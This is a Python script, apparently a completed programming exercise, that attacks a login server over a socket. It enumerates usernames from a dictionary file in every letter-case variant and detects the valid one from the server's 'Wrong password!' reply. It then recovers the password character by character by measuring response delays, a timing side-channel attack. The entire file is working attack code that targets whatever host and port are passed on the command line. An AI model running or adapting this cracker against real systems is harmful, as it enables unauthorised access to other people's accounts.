# Initial stage just establish connection to unprotected server
# Update add brute force password hacker
# Final version uses dictionary of common admin logins and then hacks the password by
# trying all possible characters, and measuring a time delay on the 'Wrong password!'
# response when the server is catching the exception raised by the characters submitted
# matching the start of the password

import socket
import sys
import itertools
import json
from datetime import datetime

# List of password characters
letters_upper = [chr(ord('A') + i) for i in range(26)]
letters_lower = [chr(ord('a') + i) for i in range(26)]
numbers = [str(i) for i in range(10)]
possible_characters = letters_upper + letters_lower + numbers

# Initiate connection to server
with socket.socket() as socket1:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    socket1.connect(address)

    login = ''
    password = ''

    with open('logins.txt', 'r') as logins:    
        response = ''
        while response != 'Wrong password!':
            # Go through each username in login dictionary
            word = logins.readline().strip()
            # Try out all possible case combinations
            combos = map(''.join, itertools.product(*zip(word.upper(), word.lower())))
            for combo in combos:
                attempt = {
                    "login": combo,
                    "password": ""
                }
                jsn_attempt = json.dumps(attempt)
                start = datetime.now()
                socket1.send(jsn_attempt.encode())
                response = socket1.recv(1024).decode()
                finish = datetime.now()
                response = json.loads(response)
                response = response['result']
                # When response is wrong password, not wrong login, you've got the login
                if response == 'Wrong password!':
                    login = combo
                    # Empty string password always throws exception, so we can take
                    # the time measured in this attempt as standard exception interval
                    exception = finish - start
                    break
    
    while response != "Connection success!":
        response = ''
        i = -1                
        while True:
            # Attach the next possible character to the password
            i += 1
            password_attempt = password + possible_characters[i]
            attempt = {
                "login": login,
                "password": password_attempt
            }
            jsn_attempt = json.dumps(attempt)
            start = datetime.now()
            socket1.send(jsn_attempt.encode())
            response = socket1.recv(1024).decode()
            finish = datetime.now()
            response = json.loads(response)
            response = response['result']
            response_time = finish - start
            # If the password is correct, break
            if response == "Connection success!":
                break
            # If response time is more than half that of known exception, break
            if response_time > (exception / 2):
                break
        # Set the password equal to the correct starting characters
        password = password_attempt

        # If the password is correct, the loop will exit

    print(attempt)
        
